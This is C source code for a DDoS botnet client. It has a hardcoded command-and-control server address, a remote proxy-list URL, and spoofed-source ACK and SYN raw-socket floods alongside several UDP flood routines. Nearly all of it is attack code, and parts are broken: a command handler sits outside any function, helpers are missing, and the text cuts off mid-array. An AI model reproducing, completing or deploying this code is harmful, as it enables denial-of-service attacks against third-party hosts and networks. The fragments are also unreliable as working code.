#define _GNU_SOURCE
#define _DEFAULT_SOURCE
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ctype.h>
#include <sys/select.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <unistd.h>
#define STD2_SIZE 1024
#define MAXTTL 255

#ifdef __APPLE__
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
#endif
#include <pthread.h>
#define MAX_PACKET_SIZE 4096
#define PROXY_URL "https://html-starter-nine-gamma.vercel.app/proxy.txt"
#define PROXY_TIMEOUT 5
static uint32_t Q[4096], c = 362436;  // Single declaration
static unsigned int floodPort;
static unsigned int packetsPerSecond;
static unsigned int sleepTime = 100;
static int limiter;
static unsigned int ack_flood_port;
static volatile int ack_limiter;
static volatile unsigned int ack_pps;
static volatile unsigned int ack_sleeptime = 100;
static int http_flood_duration = 0;
static char *http_flood_url = NULL;
static unsigned int http_flood_port = 80;
const char *commServer[] = {"23.157.176.170:4258"};
#define MAX_PROXIES 5000
char *proxies[MAX_PROXIES];
int proxy_count = 0;
pthread_mutex_t proxy_mutex = PTHREAD_MUTEX_INITIALIZER;


static int duration = 0;
static char *url = NULL;

const char *dns = "8.8.4.4";

const char *useragents[] = {
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"TheSuBot/0.2 (www.thesubot.de)",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};


int initConnection();
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
unsigned char macAddress[6] = {0};

static void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

static uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;
    return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr(dns);
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}

char *strdup(const char *s) {
    char *d = malloc(strlen(s) + 1);
    if(d) strcpy(d, s);
    return d;
}


    static unsigned short csum_ack(unsigned short *buf, int count) {
        register unsigned long sum = 0;
        while(count-- > 0) sum += *buf++;
        sum = (sum >> 16) + (sum & 0xffff);
        return (unsigned short)(~sum);
    }

    // Функция для расчета TCP контрольной суммы
    static unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int len) {
        struct tcp_pseudo {
            unsigned long src;
            unsigned long dst;
            unsigned char zero;
            unsigned char proto;
            unsigned short length;
        } pseudohead = {
            .src = iph->saddr,
            .dst = iph->daddr,
            .zero = 0,
            .proto = IPPROTO_TCP,
            .length = htons(sizeof(struct tcphdr) + len)
        };

        char pseudogram[sizeof(pseudohead) + sizeof(*tcph) + len];
        memcpy(pseudogram, &pseudohead, sizeof(pseudohead));
        memcpy(pseudogram + sizeof(pseudohead), tcph, sizeof(*tcph) + len);
        return csum_ack((unsigned short*)pseudogram, sizeof(pseudogram)/2);
    }

    static void *ack_flood(void *arg) {
        struct sockaddr_in sin;
        char *target = (char*)arg;
        char packet[4096];
        struct iphdr *iph = (struct iphdr*)packet;
        struct tcphdr *tcph = (struct tcphdr*)(iph + 1);

        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(ack_flood_port);
        inet_pton(AF_INET, target, &sin.sin_addr);
        tcph->ack_seq = htonl(rand_cmwc());
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(sock < 0) return NULL;

        int tmp = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));

        memset(packet, 0, sizeof(packet));

        // Настройка IP заголовка
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->frag_off = htons(0x4000);
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;

        // Настройка TCP заголовка
        tcph->dest = htons(ack_flood_port);
        tcph->ack_seq = htonl(rand_cmwc());
        tcph->ack = 1;
        tcph->doff = 5;

        while(1) {
            // Рандомизация параметров
            iph->saddr = htonl(rand_cmwc());
            iph->id = htons(rand_cmwc());
            tcph->source = htons(rand_cmwc());
            tcph->check = 0;
            tcph->window = htons(rand_cmwc() % 65535);

            // Пересчет контрольных сумм
            iph->check = csum_ack((unsigned short*)iph, sizeof(*iph)/2);
            tcph->check = tcpcsum(iph, tcph, 0);

            sendto(sock, packet, ntohs(iph->tot_len), 0,
                  (struct sockaddr*)&sin, sizeof(sin));

            ack_pps++;
            if(ack_pps % 1000 == 0) usleep(ack_sleeptime);
        }
        close(sock);
        return NULL;
    }

void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
#define PAD_RIGHT 1
#define PAD_ZERO 2

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

#define PRINT_BUF_LEN 12

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = va_arg(args, char *);
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}
//
int getHost(const char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}


int recvLine(int socket, char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}


int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}
void SendSTD(unsigned char *ip, int port, int secs)
{
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {// random std string
        char *randstrings[] = {"PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","YakuzaBotnet","Scarface1337"};
        char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
        if (a >= 50)
        {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(iSTD_Sock);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
//attacks
void xtdcustom(unsigned char *ip, int port, int secs)
{
        int string = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {
                char *stringme[] = {"8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"};
                if (a >= 50)
                {
                        send(string, stringme, 1460, 0);
                        connect(string,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(string);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void UDPRAW(unsigned char *ip, int port, int secs)
{
        int string = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {
                char *stringme[] = {"\x8f"};
                if (a >= 50)
                {
                        send(string, stringme, 1460, 0);
                        connect(string,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(string);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void TCPRAW(unsigned char *ip, int port, int secs) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) return;

    int hincl = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*)&sin, sizeof(sin));
    bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);

    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(iph + 1);

    time_t start = time(NULL);
    while(1) {
        // Генерация заголовков как в ack_flood
        iph->saddr = htonl(rand_cmwc());
        iph->daddr = sin.sin_addr.s_addr;
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(packet));
        iph->id = htons(rand_cmwc());
        iph->frag_off = htons(0x4000);
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_TCP;
        iph->check = csum((unsigned short*)iph, sizeof(*iph)/2);

        tcph->source = htons(rand_cmwc());
        tcph->dest = htons(port);
        tcph->seq = htonl(rand_cmwc());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;

        // Расчет контрольной суммы как в ack_flood
        struct pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudogram[sizeof(psh) + sizeof(*tcph)];
        memcpy(pseudogram, &psh, sizeof(psh));
        memcpy(pseudogram + sizeof(psh), tcph, sizeof(*tcph));
        tcph->check = csum((unsigned short*)pseudogram, sizeof(pseudogram)/2);

        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&sin, sizeof(sin));
        
        if(time(NULL) >= start + secs) {
            close(sock);
            _exit(0);
        }
    }
}

else if(!strcmp(argv[0], "TCPRAW")) {
    if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) return;
    
    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    if(strstr(ip, ",")) {
        unsigned char *hi = strtok(ip, ",");
        while(hi != NULL) {
            if(!listFork()) {
                TCPRAW(hi, port, time);
                _exit(0);
            }
            hi = strtok(NULL, ",");
        }
    } else {
        if(listFork()) return;
        TCPRAW(ip, port, time);
        _exit(0);
    }
}
        void Randhex(unsigned char *ip, int port, int secs) {
            int iSTD_Sock;
            iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
               time_t start = time(NULL);
            struct sockaddr_in sin;
            struct hostent *hp;
              hp = gethostbyname(ip);
            bzero((char*) &sin,sizeof(sin));
            bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
            sin.sin_family = hp->h_addrtype;
            sin.sin_port = port;
            unsigned int a = 0;
            while(1){// random std string
                char *randstrings[] = {"\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","